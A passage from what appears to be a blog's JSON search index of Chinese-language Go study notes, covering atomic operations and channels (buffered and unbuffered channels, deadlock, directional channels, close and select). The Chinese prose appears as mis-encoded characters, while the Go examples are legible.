åŸå­æ“ä½œå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä»€ä¹ˆå¿…é¡»æ˜¯ï¼ˆæ•´å‹ï¼‰æŒ‡é’ˆç±»å‹ï¼Ÿ å› ä¸ºæ•´å‹ä½œä¸ºå‡½æ•°å‚æ•°æ˜¯å€¼ä¼ é€’ï¼Œè¢«ä¼ å…¥çš„å‚æ•°å€¼éƒ½ä¼šè¢«å¤åˆ¶ä¸€ä»½ï¼Œå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œä¿®æ”¹æ˜¯ä¸ä¼šå½±å“åˆ°åŸå€¼çš„ï¼Œå› æ­¤ï¼Œæƒ³è¦ä¿®æ”¹åŸå€¼ï¼Œå°±å¿…é¡»ä¼ å…¥è¢«è¢«æ“ä½œå€¼çš„æŒ‡é’ˆï¼Œè€Œä¸æ˜¯è¿™ä¸ªå€¼æœ¬èº«ã€‚ 2. ç”¨äºåŸå­åŠ æ³•æ“ä½œçš„å‡½æ•°å¯ä»¥åšåŸå­å‡æ³•å—ï¼Ÿ å¯ä»¥çš„ï¼Œatomic.AddInt32 å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä»£è¡¨å·®é‡ï¼Œå®ƒçš„ç±»å‹å¯ä»¥æ˜¯ int32ï¼Œæ˜¯æœ‰ç¬¦å·çš„ã€‚å› æ­¤ï¼Œå¦‚æœæƒ³åšåŸå­å‡æ³•ï¼Œé‚£ä¹ˆæŠŠè¿™ä¸ªå·®é‡è®¾ç½®ä¸ºè´Ÿæ•´æ•°å°±å¯ä»¥äº†ã€‚ æ€»ç»“ ä¸è¦æŠŠå†…éƒ¨ä½¿ç”¨çš„åŸå­å€¼æš´éœ²ç»™å¤–ç•Œã€‚æ¯”å¦‚ï¼Œå£°æ˜ä¸€ä¸ªå…¨å±€çš„åŸå­å˜é‡å¹¶ä¸æ˜¯ä¸€ä¸ªæ­£ç¡®çš„åšæ³•ã€‚è¿™ä¸ªå˜é‡çš„è®¿é—®æƒé™æœ€èµ·ç ä¹Ÿåº”è¯¥æ˜¯åŒ…çº§ç§æœ‰çš„ã€‚ å¦‚æœä¸å¾—ä¸è®©åŒ…å¤–ï¼Œæˆ–æ¨¡å—å¤–çš„ä»£ç ä½¿ç”¨ä½ çš„åŸå­å€¼ï¼Œé‚£ä¹ˆå¯ä»¥å£°æ˜ä¸€ä¸ªåŒ…çº§ç§æœ‰çš„åŸå­å˜é‡ï¼Œç„¶åå†é€šè¿‡ä¸€ä¸ªæˆ–å¤šä¸ªå…¬å¼€çš„å‡½æ•°ï¼Œè®©å¤–ç•Œé—´æ¥åœ°ä½¿ç”¨åˆ°å®ƒã€‚æ³¨æ„ï¼Œè¿™ç§æƒ…å†µä¸‹ä¸è¦æŠŠåŸå­å€¼ä¼ é€’åˆ°å¤–ç•Œï¼Œä¸è®ºæ˜¯ä¼ é€’åŸå­å€¼æœ¬èº«è¿˜æ˜¯å®ƒçš„æŒ‡é’ˆå€¼ã€‚ å¦‚æœé€šè¿‡æŸä¸ªå‡½æ•°å¯ä»¥å‘å†…éƒ¨çš„åŸå­å€¼å­˜å‚¨å€¼çš„è¯ï¼Œé‚£ä¹ˆå°±åº”è¯¥åœ¨è¿™ä¸ªå‡½æ•°ä¸­å…ˆåˆ¤æ–­è¢«å­˜å‚¨å€¼ç±»å‹çš„åˆæ³•æ€§ã€‚è‹¥ä¸åˆæ³•ï¼Œåˆ™åº”è¯¥ç›´æ¥è¿”å›å¯¹åº”çš„é”™è¯¯å€¼ï¼Œä»è€Œé¿å… panic çš„å‘ç”Ÿã€‚ å¦‚æœå¯èƒ½çš„è¯ï¼Œå¯ä»¥æŠŠåŸå­å€¼å°è£…åˆ°ä¸€ä¸ªæ•°æ®ç±»å‹ä¸­ï¼Œæ¯”å¦‚ä¸€ä¸ªç»“æ„ä½“ç±»å‹ã€‚è¿™æ ·ï¼Œæ—¢å¯ä»¥é€šè¿‡è¯¥ç±»å‹çš„æ–¹æ³•æ›´åŠ å®‰å…¨åœ°å­˜å‚¨å€¼ï¼Œåˆå¯ä»¥åœ¨è¯¥ç±»å‹ä¸­åŒ…å«å¯å­˜å‚¨å€¼çš„åˆæ³•ç±»å‹ä¿¡æ¯ã€‚ å‚è€ƒé“¾æ¥ Go è¯­è¨€æ ¸å¿ƒ 36 è®²","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”channel","slug":"go-language-study-notes-channel","date":"2022-11-07T02:33:41.000Z","updated":"2023-02-18T03:28:33.586Z","comments":true,"path":"go-language-study-notes-channel/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-channel/","excerpt":"å¦‚æœ main goroutine é€€å‡ºäº†ï¼Œé‚£ä¹ˆä¹Ÿæ„å‘³ç€æ•´ä¸ªåº”ç”¨ç¨‹åºçš„é€€å‡ºã€‚ æ­¤å¤–ï¼Œè¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œgoroutine æ‰§è¡Œçš„å‡½æ•°æˆ–æ–¹æ³•å³ä¾¿æœ‰è¿”å›å€¼ï¼ŒGo ä¹Ÿä¼šå¿½ç•¥è¿™äº›è¿”å›å€¼ã€‚æ‰€ä»¥ï¼Œå¦‚æœè¦è·å– goroutine æ‰§è¡Œåçš„è¿”å›å€¼ï¼Œéœ€è¦å¦è¡Œè€ƒè™‘å…¶ä»–æ–¹æ³•ï¼Œæ¯”å¦‚é€šè¿‡ goroutine é—´çš„é€šä¿¡æ¥å®ç°ã€‚","text":"å¦‚æœ main goroutine é€€å‡ºäº†ï¼Œé‚£ä¹ˆä¹Ÿæ„å‘³ç€æ•´ä¸ªåº”ç”¨ç¨‹åºçš„é€€å‡ºã€‚ æ­¤å¤–ï¼Œè¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œgoroutine æ‰§è¡Œçš„å‡½æ•°æˆ–æ–¹æ³•å³ä¾¿æœ‰è¿”å›å€¼ï¼ŒGo ä¹Ÿä¼šå¿½ç•¥è¿™äº›è¿”å›å€¼ã€‚æ‰€ä»¥ï¼Œå¦‚æœè¦è·å– goroutine æ‰§è¡Œåçš„è¿”å›å€¼ï¼Œéœ€è¦å¦è¡Œè€ƒè™‘å…¶ä»–æ–¹æ³•ï¼Œæ¯”å¦‚é€šè¿‡ goroutine é—´çš„é€šä¿¡æ¥å®ç°ã€‚ goroutine é—´çš„é€šä¿¡ä¼ ç»Ÿçš„ç¼–ç¨‹è¯­è¨€ï¼ˆC++ã€Javaã€Python ç­‰ï¼‰å¹¶éé¢å‘å¹¶å‘è€Œç”Ÿçš„ï¼Œæ‰€ä»¥å®ƒä»¬é¢å¯¹å¹¶å‘çš„é€»è¾‘å¤šæ˜¯åŸºäºæ“ä½œç³»ç»Ÿçš„çº¿ç¨‹ã€‚ çº¿ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œåˆ©ç”¨çš„ä¹Ÿæ˜¯æ“ä½œç³»ç»Ÿæä¾›çš„çº¿ç¨‹æˆ–è¿›ç¨‹é—´é€šä¿¡çš„åŸè¯­ï¼Œæ¯”å¦‚ï¼šå…±äº«å†…å­˜ã€ä¿¡å·ï¼ˆsignalï¼‰ã€ç®¡é“ï¼ˆpipeï¼‰ã€æ¶ˆæ¯é˜Ÿåˆ—ã€å¥—æ¥å­—ï¼ˆsocketï¼‰ç­‰ã€‚ åœ¨è¿™äº›é€šä¿¡åŸè¯­ä¸­ï¼Œä½¿ç”¨æœ€å¤šã€æœ€å¹¿æ³›çš„ï¼ˆä¹Ÿæ˜¯æœ€é«˜æ•ˆçš„ï¼‰æ˜¯ç»“åˆäº†çº¿ç¨‹åŒæ­¥åŸè¯­ï¼ˆæ¯”å¦‚ï¼šé”ä»¥åŠæ›´ä¸ºä½çº§çš„åŸå­æ“ä½œï¼‰çš„å…±äº«å†…å­˜æ–¹å¼ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è¯´ä¼ ç»Ÿè¯­è¨€çš„å¹¶å‘æ¨¡å‹æ˜¯åŸºäºå¯¹å†…å­˜çš„å…±äº«çš„ã€‚ Go è¯­è¨€ä»è®¾è®¡ä¼Šå§‹ï¼Œå°±å°†è§£å†³ä¸Šé¢è¿™ä¸ªä¼ ç»Ÿå¹¶å‘æ¨¡å‹çš„é—®é¢˜ä½œä¸º Go çš„ä¸€ä¸ªç›®æ ‡ï¼Œå¹¶åœ¨æ–°å¹¶å‘æ¨¡å‹è®¾è®¡ä¸­å€Ÿé‰´äº†è‘—åè®¡ç®—æœºç§‘å­¦å®¶Tony Hoareæå‡ºçš„ CSPï¼ˆCommunicationing Sequential Processesï¼Œé€šä¿¡é¡ºåºè¿›ç¨‹ï¼‰å¹¶å‘æ¨¡å‹ã€‚ ç®€å•çœ‹ä¸‹ CSP çš„é€šä¿¡æ¨¡å‹ç¤ºæ„å›¾ï¼š åœ¨ Go ä¸­ï¼Œä¸â€œProcessâ€å¯¹åº”çš„æ˜¯ goroutineã€‚ä¸ºäº†å®ç° CSP å¹¶å‘æ¨¡å‹ä¸­çš„è¾“å…¥å’Œè¾“å‡ºåŸè¯­ï¼ŒGo è¿˜å¼•å…¥äº† goroutineï¼ˆPï¼‰ä¹‹é—´çš„é€šä¿¡åŸè¯­channelã€‚ goroutine é€šè¿‡ channel è·å–è¾“å…¥æ•°æ®ï¼Œå†å°†å¤„ç†åå¾—åˆ°çš„ç»“æœé€šè¿‡ channel è¾“å‡ºã€‚é€šè¿‡ channel å°† goroutineï¼ˆPï¼‰ç»„åˆè¿æ¥åœ¨ä¸€èµ·ï¼Œè®©è®¾è®¡å’Œç¼–å†™å¤§å‹å¹¶å‘ç³»ç»Ÿå˜å¾—æ›´åŠ ç®€å•å’Œæ¸…æ™°ã€‚ æ¯”å¦‚ä¸Šé¢æåˆ°çš„è·å– goroutine çš„é€€å‡ºçŠ¶æ€ï¼Œå°±å¯ä»¥ä½¿ç”¨ channel åŸè¯­å®ç°ï¼š 123456789101112131415func spawn(f func() error) &lt;-chan error &#123; c := make(chan error) go func() &#123; c &lt;- f() &#125;() return c&#125;func main() &#123; c := spawn(func() error &#123; time.Sleep(2 * time.Second) return errors.New(\"timeout\") &#125;) fmt.Println(&lt;-c)&#125; è¿è¡Œä¸Šé¢çš„å®ä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 12// å»¶è¿Ÿ 2s æ‰“å°timeout è¯¥ç¤ºä¾‹åœ¨ main.goroutine ä¸å­ goroutine ä¹‹é—´å»ºç«‹ä¸€ä¸ªå…ƒç´ ç±»å‹ä¸º error çš„ channelï¼Œå­ goroutine é€€å‡ºæ—¶ï¼Œä¼šå°†å®ƒæ‰§è¡Œçš„å‡½æ•°çš„é”™è¯¯å€¼å†™å…¥è¿™ä¸ª channelï¼Œmain.goroutine å¯ä»¥é€šè¿‡è¯»å– channel çš„å€¼æ¥è·å–å­ gotouine çš„é€€å‡ºçŠ¶æ€ã€‚ åˆ›å»º channelchannel ä¹Ÿæ˜¯ä¸€ç­‰å…¬æ°‘ã€‚ å¯ä»¥åƒä½¿ç”¨æ™®é€šå˜é‡é‚£æ ·ä½¿ç”¨ channelï¼Œå®šä¹‰ channel ç±»å‹å˜é‡ï¼Œç»™ channel å˜é‡èµ‹å€¼ï¼Œå°† channel ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•° / æ–¹æ³•ã€å°† channel ä½œä¸ºè¿”å›å€¼ä»å‡½æ•° / æ–¹æ³•ä¸­è¿”å›ï¼Œç”šè‡³å°† channel å‘é€åˆ°å…¶ä»– channel ä¸­ã€‚ å’Œåˆ‡ç‰‡ã€ç»“æ„ä½“ã€map ç­‰ä¸€æ ·ï¼Œchannel ä¹Ÿæ˜¯ä¸€ç§å¤åˆæ•°æ®ç±»å‹ã€‚å¤åˆæ•°æ®ç±»å‹ï¼Œåœ¨å£°æ˜ç±»å‹å˜é‡æ—¶ï¼Œå¿…é¡»ç»™å‡ºå…·ä½“çš„å…ƒç´ ç±»å‹ã€‚ 1var ch chan int ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œå£°æ˜äº†ä¸€ä¸ªå…ƒç´ ä¸º int ç±»å‹çš„ channel ç±»å‹å˜é‡ chã€‚ å¦‚æœ channel ç±»å‹å˜é‡åœ¨å£°æ˜æ—¶æ²¡æœ‰è¢«èµ‹äºˆåˆå€¼ï¼Œé‚£ä¹ˆå®ƒçš„é»˜è®¤å€¼ä¸º nilã€‚ å’Œå…¶ä»–å¤åˆç±»å‹ä¸åŒçš„æ˜¯ï¼Œç»™ channel ç±»å‹å˜é‡èµ‹åˆå€¼çš„å”¯ä¸€æ–¹å¼å°±æ˜¯ make è¿™ä¸ª Go é¢„å®šä¹‰å‡½æ•°ï¼š 12ch1 := make(chan int)ch2 := make(chan int, 5) ch1 è¡¨ç¤ºå…ƒç´ ç±»å‹ä¸º int çš„ channel ç±»å‹ï¼Œæ˜¯æ— ç¼“å†² channel; ch2 è¡¨ç¤ºå…ƒç´ ç±»å‹ä¸º int çš„ channel ç±»å‹ï¼Œå¸¦ç¼“å†² channelï¼Œä¸”ç¼“å†²åŒºé•¿åº¦ä¸º 5ã€‚ è¿™ä¸¤ç§ç±»å‹å˜é‡å…³äºå‘é€ï¼ˆsendï¼‰å’Œæ¥æ”¶ï¼ˆreceiveï¼‰çš„ç‰¹æ€§æ˜¯ä¸åŒçš„ï¼Œä¸‹é¢åŸºäºè¿™ä¸¤ç§ç±»å‹çš„ channelï¼Œçœ‹çœ‹ channel ç±»å‹å˜é‡å¦‚ä½•è¿›è¡Œå‘é€å’Œæ¥æ”¶æ•°æ®å…ƒç´ ã€‚ å‘é€ä¸æ¥æ”¶Go æä¾›äº†&lt;-æ“ä½œç¬¦ç”¨äºå¯¹ channel ç±»å‹å˜é‡è¿›è¡Œå‘é€ä¸æ¥æ”¶æ“ä½œï¼š 1234ch1 &lt;- 13 // å°†æ•´å‹å­—é¢å€¼ 13 å‘é€åˆ°æ— ç¼“å†² channel ç±»å‹å˜é‡ ch1 ä¸­n := &lt;- ch1 // å°†æ— ç¼“å†² channel ç±»å‹å˜é‡ ch1 ä¸­æ¥æ”¶çš„æ•´å‹å€¼å­˜å‚¨åˆ°æ•´å‹å˜é‡ n ä¸­ch2 &lt;- 17 // å°†æ•´å‹å­—é¢å€¼ 17 å‘é€åˆ°å¸¦ç¼“å†² channel ç±»å‹å˜é‡ ch2 ä¸­m := &lt;- ch2 // ä»å¸¦ç¼“å†² channel ç±»å‹å˜é‡ ch2 ä¸­æ¥æ”¶ä¸€ä¸ªæ•´å‹å€¼å­˜å‚¨åˆ°æ•´å‹å˜é‡ m ä¸­ åœ¨ç†è§£ channel çš„å‘é€ä¸æ¥æ”¶æ“ä½œæ—¶ï¼Œä½ ä¸€å®šè¦å§‹ç»ˆç‰¢è®°ï¼šchannel æ˜¯ç”¨äº Goroutine é—´é€šä¿¡çš„ï¼Œæ‰€ä»¥ç»å¤§å¤šæ•°å¯¹ channel çš„è¯»å†™éƒ½è¢«åˆ†åˆ«æ”¾åœ¨äº†ä¸åŒçš„ Goroutine ä¸­ã€‚ æ— ç¼“å†² channelç”±äºæ— ç¼“å†² channel çš„è¿è¡Œæ—¶å±‚å®ç°ä¸å¸¦æœ‰ç¼“å†²åŒºï¼Œæ‰€æœ‰ goroutine å¯¹æ— ç¼“å†² channel çš„æ¥æ”¶å’Œå‘é€æ˜¯åŒæ­¥çš„ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹åŒä¸€ä¸ªæ— ç¼“å†² channelï¼Œåªæœ‰å¯¹å®ƒè¿›è¡Œæ¥æ”¶æ“ä½œçš„ Goroutine å’Œå¯¹å®ƒè¿›è¡Œå‘é€æ“ä½œçš„ Goroutine éƒ½å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œé€šä¿¡æ‰èƒ½å¾—ä»¥è¿›è¡Œï¼Œå¯ä»¥ç»“åˆ goroutine å¹¶å‘æ¨¡å‹ç†è§£ï¼š å¦åˆ™å•æ–¹é¢çš„æ“ä½œä¼šè®©å¯¹åº”çš„ Goroutine é™·å…¥æŒ‚èµ·çŠ¶æ€ï¼Œæ¯”å¦‚ä¸‹é¢ç¤ºä¾‹ä»£ç ï¼š 123456func main() &#123; ch1 := make(chan int) ch1 &lt;- 13 // fatal error: all goroutines are asleep - deadlock! n := &lt;-ch1 println(n)&#125; åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œåˆ›å»ºäº†ä¸€ä¸ªæ— ç¼“å†² channel ç±»å‹å˜é‡ ch1ï¼Œå¯¹ ch1 çš„è¯»å’Œå†™éƒ½æ”¾åœ¨ä¸€ä¸ª goroutine ä¸­äº†ï¼ˆå› ä¸ºè¿™é‡Œæ²¡æœ‰æ‰‹åŠ¨åˆ›å»º goroutineï¼Œå› æ­¤åªæœ‰ main goroutineï¼‰ï¼Œå› æ­¤é™·å…¥æŒ‚èµ·çŠ¶æ€äº†ï¼Œè¿™ä¹Ÿæ˜¯ä¸Šé¢æåˆ°çš„ï¼Œä¸ºä»€ä¹ˆè¦æŠŠå¯¹ channel çš„è¯»å†™æ”¾åœ¨ä¸åŒçš„ goroutine ä¸­çš„åŸå› ã€‚ è§£å†³åŠæ³•ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦å°†æ¥å£æ“ä½œæˆ–è€…å‘é€æ“ä½œæ”¾åˆ°å¦å¤–ä¸€ä¸ª goroutine ä¸­å°±å¯ä»¥äº†ã€‚ 12345678func main() &#123; ch1 := make(chan int) go func() &#123; ch1 &lt;- 13 // å°†å‘é€æ“ä½œæ”¾å…¥ä¸€ä¸ªæ–°goroutineä¸­æ‰§è¡Œ &#125;() n := &lt;-ch1 println(n)&#125; ç”±æ­¤ï¼Œå¯ä»¥å¾—å‡ºç»“è®ºï¼šå¯¹æ— ç¼“å†² channel ç±»å‹çš„å‘é€ä¸æ¥æ”¶æ“ä½œï¼Œä¸€å®šè¦æ”¾åœ¨ä¸¤ä¸ªä¸åŒçš„ Goroutine ä¸­è¿›è¡Œï¼Œå¦åˆ™ä¼šå¯¼è‡´ deadlockï¼ˆæ­»é”ï¼‰ã€‚ ç¼“å†²å¸¦ channelå’Œæ— ç¼“å†² channel ç›¸åï¼Œå¸¦ç¼“å†² channel çš„è¿è¡Œæ—¶å±‚é¢å®ç°å¸¦æœ‰ç¼“å†²åŒºï¼Œå› æ­¤ï¼Œå¯¹å¸¦ç¼“å†² channel çš„å‘é€æ“ä½œåœ¨ç¼“å†²åŒºæœªæ»¡ã€æ¥æ”¶æ“ä½œåœ¨ç¼“å†²åŒºéç©ºçš„æƒ…å†µä¸‹æ˜¯å¼‚æ­¥çš„ï¼ˆå‘é€æˆ–æ¥æ”¶æ— éœ€é˜»å¡ç­‰å¾…ï¼‰ã€‚ ä¹Ÿå°±æ˜¯ï¼Œä¸‹é¢å››ç§æƒ…å†µï¼ˆä»…é’ˆå¯¹ å¸¦ç¼“å†² channelï¼‰ï¼š å¦‚æœç¼“å†²åŒºå·²æ»¡ï¼Œè¿›è¡Œå‘é€æ“ä½œï¼Œä¼šå¯¼è‡´ goroutine æŒ‚èµ· å¦‚æœç¼“å†²åŒºæœªæ»¡ï¼Œè¿›è¡Œå‘é€æ“ä½œï¼Œä¸ä¼šå¯¼è‡´ goroutine é˜»å¡æŒ‚èµ· å¦‚æœç¼“å†²åŒºä¸ºç©ºï¼Œè¿›è¡Œæ¥æ”¶æ“ä½œï¼Œä¼šå¯¼è‡´ goroutine é˜»å¡æŒ‚èµ· å¦‚æœç¼“å†²åŒºæœ‰æ•°æ®ï¼Œè¿›è¡Œæ¥æ”¶æ“ä½œï¼Œä¸ä¼šå¯¼è‡´ goroutine é˜»å¡æŒ‚èµ· å¯ä»¥ç»“åˆä¸‹é¢çš„ç¤ºä¾‹ä»£ç ç†è§£ï¼š 123456789101112package mainfunc main() &#123; ch2 := make(chan int, 1) // ä»ch2 çš„ç¼“å†²åŒºæ¥æ”¶æ•°æ® n := &lt;-ch2 // å› ä¸ºæ­¤æ—¶ch2 çš„ç¼“å†²åŒºä¸­æ— æ•°æ®ï¼Œå› æ­¤å°†ä¼šå¯¼è‡´ goroutine æŒ‚èµ· fmt.Println(n) ch3 := make(chan int, 1) ch3 &lt;- 17 // å‘ ch3 å‘é€ä¸€ä¸ªæ•´å‹æ•° ch3 &lt;- 18 // ç”±äºæ­¤æ—¶ch3ä¸­ç¼“å†²åŒºå·²æ»¡ï¼Œå†å‘ch3å‘é€æ•°æ®ä¹Ÿå°†å¯¼è‡´ goroutine æŒ‚èµ·&#125; ä¹Ÿæ­£æ˜¯å› ä¸ºå¸¦ç¼“å†² channel ä¸æ— ç¼“å†² channel åœ¨å‘é€ä¸æ¥æ”¶è¡Œä¸ºä¸Šçš„å·®å¼‚ï¼Œåœ¨å…·ä½“ä½¿ç”¨ä¸Šï¼Œå®ƒä»¬æœ‰å„è‡ªçš„â€œç”¨æ­¦ä¹‹åœ°â€ï¼Œè¿™ä¸ªæˆ‘ä»¬ç­‰ä¼šå†ç»†è¯´ï¼Œç°åœ¨æˆ‘ä»¬å…ˆç»§ç»­æŠŠ channel çš„åŸºæœ¬è¯­æ³•è®²å®Œã€‚ ä½¿ç”¨æ“ä½œç¬¦&lt;-ï¼Œè¿˜å¯ä»¥å£°æ˜åªå‘é€ channel ç±»å‹ï¼ˆsend-onlyï¼‰å’Œåªæ¥æ”¶ channel ç±»å‹ï¼ˆrecv-onlyï¼‰ï¼Œæ¥ç€çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š 1234ch1 := make(chan&lt;- int, 1) // åªå‘é€channelç±»å‹ch2 := make(&lt;-chan int, 1) // åªæ¥æ”¶channelç±»å‹&lt;-ch1 // invalid operation: &lt;-ch1 (receive from send-only type chan&lt;- int)ch2 &lt;- 13 // invalid operation: ch2 &lt;- 13 (send to receive-only type &lt;-chan int) å¯ä»¥ä»ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­çœ‹åˆ°ï¼Œè¯•å›¾ä»ä¸€ä¸ªåªå‘é€ channel ç±»å‹å˜é‡ä¸­æ¥æ”¶æ•°æ®ï¼Œæˆ–è€…å‘ä¸€ä¸ªåªæ¥æ”¶ channel ç±»å‹å‘é€æ•°æ®ï¼Œéƒ½ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚ é€šå¸¸åªå‘é€ channel ç±»å‹å’Œåªæ¥æ”¶ channel ç±»å‹ï¼Œä¼šè¢«ç”¨ä½œå‡½æ•°çš„å‚æ•°ç±»å‹æˆ–è¿”å›å€¼ï¼Œç”¨äºé™åˆ¶å¯¹ channel å†…çš„æ“ä½œï¼Œæˆ–è€…æ˜¯æ˜ç¡®å¯å¯¹ channel è¿›è¡Œçš„æ“ä½œçš„ç±»å‹ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š 1234567891011121314151617181920212223242526func produce(ch chan&lt;- int) &#123; for i := 0; i &lt; 10; i++ &#123; ch &lt;- i + 1 time.Sleep(time.Second) &#125; close(ch)&#125;func consume(ch &lt;-chan int) &#123; for n := range ch &#123; println(n) &#125;&#125;func main() &#123; ch := make(chan int, 5) var wg sync.WaitGroup wg.Add(2) go func() &#123; produce(ch) wg.Done() &#125;() go func() &#123; consume(ch) wg.Done() &#125;() wg.Wait()&#125; åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œåˆ†åˆ«å¯åŠ¨äº†ä¸¤ä¸ª goroutineï¼Œåˆ†åˆ«ä»£è¡¨ç”Ÿäº§è€…ï¼ˆproduceï¼‰å’Œæ¶ˆè´¹è€…ï¼ˆconsumeï¼‰ã€‚ ç”Ÿäº§è€…åªèƒ½å‘ channel ä¸­å‘é€æ•°æ®ï¼Œä½¿ç”¨ chan&lt;- int ä½œä¸º produce å‡½æ•°çš„å‚æ•°ç±»å‹ã€‚æ¶ˆè´¹è€…åªèƒ½ä» channel ä¸­æ¥æ”¶æ•°æ®ï¼Œä½¿ç”¨ int&lt;- chan ä½œä¸º consume å‡½æ•°çš„å‚æ•°ç±»å‹ã€‚ åœ¨æ¶ˆè´¹è€…å‡½æ•°ä¸­ï¼Œä½¿ç”¨ for range ä» channel ä¸­æ¥æ”¶æ•°æ®ï¼Œfor range ä¼šé˜»å¡åœ¨å¯¹ channel çš„æ¥æ”¶æ“ä½œï¼Œç›´åˆ° channel ä¸­æœ‰æ•°æ®å¯ä»¥æ¥æ”¶æˆ–è€…channel è¢«å…³é—­å¾ªç¯ï¼Œæ‰ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚channel è¢«å…³é—­åï¼Œfor range å¾ªç¯ä¹Ÿå°±ç»“æŸäº†ã€‚ å…³é—­ channelåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œproduce å‡½æ•°åœ¨å‘é€å®Œæ•°æ®åï¼Œè°ƒç”¨ Go å†…ç½®çš„ close å‡½æ•°å…³é—­äº† channelã€‚channel å…³é—­åï¼Œæ‰€æœ‰ç­‰å¾…ä»è¿™ä¸ª channel æ¥æ”¶æ•°æ®çš„æ“ä½œéƒ½å°†è¿”å›ã€‚ é‡‡ç”¨ä¸åŒæ¥æ”¶è¯­æ³•å½¢å¼çš„è¯­å¥ï¼Œåœ¨ channel è¢«å…³é—­åçš„è¿”å›å€¼çš„æƒ…å†µï¼š n := &lt;- chï¼šå½“chè¢«å…³é—­åï¼Œnå°†è¢«èµ‹å€¼ä¸ºchå…ƒç´ ç±»å‹çš„é›¶å€¼ï¼Œæ— æ³•å‡†ç¡®åˆ¤æ–­ channel æ˜¯å¦è¢«å…³é—­ m, ok := &lt;-chï¼šå½“chè¢«å…³é—­åï¼Œmå°†è¢«èµ‹å€¼ä¸ºchå…ƒç´ ç±»å‹çš„é›¶å€¼, okå€¼ä¸ºfalseï¼Œå¯ä»¥å‡†ç¡®åˆ¤æ–­ channel æ˜¯å¦è¢«å…³é—­ for v := range chï¼šå½“chè¢«å…³é—­åï¼Œfor rangeå¾ªç¯ç»“æŸï¼Œå¯ä»¥å‡†ç¡®åˆ¤æ–­ channel æ˜¯å¦è¢«å…³é—­ å¦å¤–ï¼Œä»ä¸Šé¢çš„ç¤ºä¾‹ä¸­è¿˜å¯ä»¥çœ‹åˆ°ï¼Œchannel æ˜¯åœ¨ produce å‡½æ•°ä¸­è¢«å…³é—­çš„ï¼Œè¿™ä¹Ÿæ˜¯ channel çš„ä¸€ä¸ªä½¿ç”¨æƒ¯ä¾‹ï¼Œé‚£å°±æ˜¯å‘é€ç«¯è´Ÿè´£å…³é—­ channelã€‚ è¿™é‡Œä¸ºä»€ä¹ˆè¦åœ¨å‘é€ç«¯å…³é—­ channel å‘¢ï¼Ÿ è¿™æ˜¯å› ä¸ºå‘é€ç«¯æ²¡æœ‰åƒæ¥å—ç«¯é‚£æ ·çš„ã€å¯ä»¥å®‰å…¨åˆ¤æ–­ channel æ˜¯å¦è¢«å…³é—­äº†çš„æ–¹æ³•ï¼ˆä¸Šé¢çš„ä¸¤ç§æ–¹å¼ï¼‰ã€‚åŒæ—¶ï¼Œä¸€æ—¦å‘ä¸€ä¸ªå·²ç»å…³é—­çš„ channel æ‰§è¡Œå‘é€æ“ä½œï¼Œè¿™ä¸ªæ“ä½œå°±ä¼šå¼•å‘ panicï¼š 123ch := make(chan int, 5)close(ch)ch &lt;- 13 // panic: send on closed channel selectå½“æ¶‰åŠåŒæ—¶å¯¹å¤šä¸ª channel è¿›è¡Œæ“ä½œæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ Go ä¸º CSP å¹¶å‘æ¨¡å‹æä¾›çš„å¦å¤–ä¸€ä¸ªåŸè¯­ selectã€‚ é€šè¿‡ selectï¼Œå¯ä»¥åŒæ—¶åœ¨å¤šä¸ª channel ä¸Šè¿›è¡Œå‘é€ / æ¥æ”¶æ“ä½œï¼š 123456789101112131415161718192021222324func main() &#123; ch1 := make(chan int, 1) ch2 := make(chan int, 1) ch3 := make(chan int, 1) ch1 &lt;- 11 ch2 &lt;- 12 ch3 &lt;- 13 select &#123; // ä» channel ch1 æ¥æ”¶æ•°æ® case x := &lt;-ch1: println(x) // ä»channel ch2æ¥æ”¶æ•°æ®ï¼Œå¹¶æ ¹æ®okå€¼åˆ¤æ–­ch2æ˜¯å¦å·²ç»å…³é—­ case y, ok := &lt;-ch2: println(ok) println(y) // ä» channel ch3 æ¥æ”¶æ•°æ® case z := &lt;-ch3: println(z) // å½“ä¸Šé¢caseä¸­çš„channel å‡æ— æ³•æ¥æ”¶æ•°æ®æ—¶ï¼Œæ‰§è¡Œè¯¥é»˜è®¤åˆ†æ”¯ default: println(\"default\") &#125;&#125; è¿™é‡Œå…ˆç®€å•äº†è§£ä¸€ä¸‹åŸºæœ¬è¯­æ³•ï¼Œåé¢å†è¯¦ç»†è®²è§£ã€‚ æ— ç¼“å†²å¸¦ channel æƒ¯ç”¨æ³•æ— ç¼“å†² channel å…¼å…·é€šä¿¡å’ŒåŒæ­¥ç‰¹æ€§ï¼Œåœ¨å¹¶å‘ç¨‹åºä¸­åº”ç”¨é¢‡ä¸ºå¹¿æ³›ã€‚ç°åœ¨æˆ‘ä»¬æ¥çœ‹çœ‹å‡ ä¸ªæ— ç¼“å†² channel çš„å…¸å‹åº”ç”¨ã€‚ ç”¨ä½œä¿¡å·ä¼ é€’æ— ç¼“å†² channel ç”¨ä½œä¿¡å·ä¼ 